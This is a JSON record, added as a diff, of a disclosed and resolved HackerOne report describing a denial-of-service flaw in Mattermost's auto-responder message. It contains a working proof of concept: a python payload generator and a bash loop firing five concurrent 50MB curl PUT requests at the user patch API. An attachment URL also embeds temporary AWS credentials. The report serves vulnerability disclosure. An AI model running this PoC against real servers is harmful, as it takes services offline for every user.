@@ -1,0 +1,217 @@
+{
+  "id": 1680241,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjgwMjQx",
+  "url": "https://hackerone.com/reports/1680241",
+  "title": "DoS via Automatic Response Message",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2022-08-25T14:48:33.390Z",
+  "submitted_at": "2022-08-25T14:48:33.481Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "vultza",
+    "url": "/vultza",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/nn900mz33sie5ce8rs5xesax9tma/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35268,
+    "url": "https://hackerone.com/mattermost",
+    "handle": "mattermost",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/268/9c24022b929e7fae94799068cf956f5c69d3ea15_original./b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/268/9c24022b929e7fae94799068cf956f5c69d3ea15_original./89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Mattermost",
+      "twitter_handle": "Mattermost",
+      "website": "https://mattermost.com",
+      "about": "Open-source collaboration, self-managed or SaaS"
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2022-4044"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2022-11-23T14:55:25.361Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-11-23T14:55:25.193Z",
+  "team_member_agreed_on_going_public_at": "2022-11-23T05:47:04.312Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nA user can enable and modify its automatic response message, that is automatically sent when the user has the \"Out of Office\" status. This response message doesn't have any size check or validation, which allows an attacker to set an almost unlimited number of characters as the response value.\n\nIn a production environment is possible to set up to 50MB of data, due to the default nginx configuration, as the response message value, which causes the server to stop responding to user requests and ultimately leads to the server crash due to the incapacity to update and handle such a large amount of data.\n\n## Steps To Reproduce:\n\n1. Login as a normal user in the platform.\n2. Grab the `MMAUTHTOKEN` authentication token.\n3. Generate the payload string, which consists in 50000000(50MB) characters. Python can be used for this:\n   ```bash\n   python2.7 -c \"print 'A' * 50000000\"\n   ```\n4. Send the following `PUT` request to the `/api/v4/users/me/patch` API Endpoint:\n   ```\n   PUT http://localhost:8065/api/v4/users/me/patch\n   Content-Type: application/json\n   X-CSRF-TOKEN: <csrf-token>\n   Cookie: MMAUTHTOKEN=<token>\n   \n   {\"notify_props\":{\"auto_responder_active\":\"true\",\"auto_responder_message\":\"<payload>\"}}\n   ```\n5. For a greater impact, the above request should be sent 5 times at the same time. After the requests are sent, the server will start to consume an abnormal quantity of computing resources, and crashes after some seconds.\n6. The application becomes unavailable for all its users.\n\nThe steps 3-6 can be automated using the following 2 commands:\n\n```bash\n$ python2.7 -c \"print '{\\\"notify_props\\\":{\\\"auto_responder_active\\\":\\\"true\\\",\\\"auto_responder_message\\\":\\\"' + 'A' * 50000000 + '\\\"}}'\" > payload\n\n$ for ((i = 0; i < 5; i++)); do curl -X PUT \"http://<domain>/api/v4/users/me/patch\" -H 'Content-Type: application/json' -d @payload --cookie \"MMAUTHTOKEN=<token>\" -H \"X-CSRF-TOKEN: <csrf-token>\" &; done;\n```\n## Supporting Material/References:\n\n  *  PoC Video \n{F1883883}\n\n## Impact\n\nA user can cause a full denial of service attack in the application server, making the application server unavailable to all its users.",
+  "weakness": {
+    "id": 48,
+    "name": "Uncontrolled Resource Consumption"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1883883,
+      "file_name": "dos-response-message.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/g5be6tqkmf6qo2ne8juww1jhiq9h?response-content-disposition=attachment%3B%20filename%3D%22dos-response-message.mp4%22%3B%20filename%2A%3DUTF-8%27%27dos-response-message.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ46JPSP6U%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T050250Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDwaCXVzLXdlc3QtMiJHMEUCIQDN%2BOksRIQv9ADNRN9IpBOMxO%2B1yzPgexSOCriUwk8AHAIgJrK5l15eVuxGb7DQwvGs35TFj6i013eV7CuXq5ItyGAqsQUIBRADGgwwMTM2MTkyNzQ4NDkiDJjsoe4gdv%2FnCSOZdCqOBZlif6fsXcbv4Wq9BSrsac2H0xEk1QDU9uqXO%2FsjVMvRqbrUHj01lumaOYNMoAwmkJSKE0DUdRy7PsMBmYKeRWcE%2FUcCtZj1aG1nlsJTXbqm1UgO7Tm7oOfMp1GLQssmChIIiXTFT27PN%2FX35S3EGPQGyYm0Kv4bI2%2F1SWOfI7iAY4j6F1nQV544U3CgMxFtnibQ6T8XXqhtfzmtakszXZ8bttEFwJG1Q7XjbsR7DHX%2BtLdVHGQ3x3LNZn%2FUuosvMyPsOuu%2BajGjOmKILC%2BPyA%2BoC0BuX9xUgv30Ie2XcQ98E1NmEiwCy9%2FYuBE4RC%2BKhrKFf%2FDS2UUB74ZuiJ9Yo3DgD42OmEWH2Mwu%2Fb8YH1IGD45lEW8Ary4CdXTbUYO2roKB1noN3PblrSLPTUr9XIRu6HhyOURaco%2FGgwth2JxpvDwDYNl%2BVDqPJBaw2BYMhnl0b8RmyJJnjWujy3lUhHNjXFRkRin0juwP8MZpIGkV7TokCoHitsRzHzcLnu6FdpslQKt7HG8WQ%2FAvfxz4SLKJ034wP7weCsay4Q%2FR74V6u33X5zQYovnjduAVu%2FwfZ9Me2SSf59Wug%2Fgb3G0ppRBNS5d2uxvNy49hks9nQV974qBJ7T9s%2FQiVLPhwzciqLgjpwTDt%2FJC0c0R4iFG2WgwM%2BCC3nfWRm667CD3fGNrKMb%2FHKPp%2F%2B2%2Fz99q4ApIzMzNDolnid6mKkG%2FBtzHjngg0uyFZJzavsEv8%2FCvVgzhpeaHR56y0MhVffZV3NE%2BdcnLUS8UZvgKQ3c9soLuEXUpgBluzCnafoJCYGisBs4pbzELdaC0Z6jUcFqO1H4rUmMAI%2BHqL5OITDQmCMmm8pd1J3DLK%2BKd8WKJgAlQQPzDr6ZzSBjqxAcPZnJS4V4vJpkOjlrkRAcyx8uoIerYr8Ul43uDcGnkwhomZ14xMvO7HZUBqqq9xnNKuqv57N%2F3oFSk06mBe2lnjV7Ue32Wk5MjanbJmDgi7cKCSRWYf3ny%2BNa%2BrAySXOUWL%2F3Uf%2BkG5Yle8%2BSpYn%2FFA4PCNyZiQ%2BYeUnLCFSZiYxOWr6lCeNUK3gNwhSInYKlQF1fyX4Sjy0yQbTdwZjLsY4i5lU42jiXoZ10tl6FogNA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7a6fca7ef4df209609b82183c179594a7327ce0da56c5d0a332096540c1e9cfc",
+      "file_size": 25046125,
+      "type": "video/mp4",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2022-12-23T05:47:04.461Z",
+  "allow_singular_disclosure_after": -111280546.12702711,
+  "singular_disclosure_allowed": true,
+  "vote_count": 8,
+  "voters": [
+    "0x800700e1",
+    "randomrootx",
+    "zy9ard3",
+    "thalaivar304",
+    "2026",
+    "shivammusic",
+    "robert7x7",
+    "argha_og"
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 5.0,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "none",
+      "integrity": "none",
+      "availability": "low"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 181349,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "Mattermost Source Code",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "1680241",
+  "votes": 8,
+  "latest_disclosable_activity_at": "2022-11-23T14:55:25.452Z",
+  "_metadata": {
+    "saved_at": "2026-07-03T13:02:50.705834",
+    "source": "https://hackerone.com/reports/1680241.json",
+    "report_id": 1680241
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjgwMjQx",
+    "databaseId": "1680241",
+    "title": "DoS via Automatic Response Message",
+    "url": "https://hackerone.com/reports/1680241",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2022-11-23T14:55:25.361Z",
+    "created_at": "2022-08-25T14:48:33.390Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzQ4",
+      "name": "Uncontrolled Resource Consumption",
+      "external_id": "cwe-400"
+    },
+    "severity": {
+      "rating": "medium",
+      "score": 5.0
+    },
+    "reporter": {
+      "username": "vultza"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzM1MjY4",
+      "handle": "mattermost",
+      "name": "Mattermost",
+      "url": "https://hackerone.com/mattermost",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS80MTgyNjI=",
+            "amount": "0.00",
+            "awarded_amount": "0.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2022-08-26T13:11:45.472Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzE2ODAyNDE=",
+    "_id": "1680241",
+    "disclosed": true,
+    "votes": 8,
+    "latest_disclosable_activity_at": "2022-11-23T14:55:25.452Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjgwMjQx",
+      "databaseId": "1680241",
+      "title": "DoS via Automatic Response Message",
+      "url": "https://hackerone.com/reports/1680241",
+      "disclosed_at": "2022-11-23T14:55:25.361Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzM1MjY4",
+      "handle": "mattermost",
+      "name": "Mattermost",
+      "url": "https://hackerone.com/mattermost",
+      "currency": "usd"
+    }
+  }
+}
